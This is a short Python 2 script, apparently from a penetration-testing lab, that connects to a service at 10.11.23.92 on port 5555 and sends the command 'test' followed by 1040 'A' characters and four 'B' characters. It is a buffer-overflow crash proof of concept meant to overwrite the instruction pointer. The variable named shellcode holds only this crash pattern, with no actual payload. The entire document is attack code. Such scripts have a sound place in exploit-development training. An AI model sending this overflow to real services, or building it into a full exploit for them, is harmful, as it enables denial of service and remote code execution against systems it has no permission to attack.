#!/usr/bin/python
import sys
import socket

crash = "A" * 1040 + "B" * 4
shellcode = 'test ' + crash + '\r\n'

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(('10.11.23.92',5555))
	message=shellcode
	s.send(message)
	s.close()

except:
	print "Error connecting to remote machine."
	sys.exit() 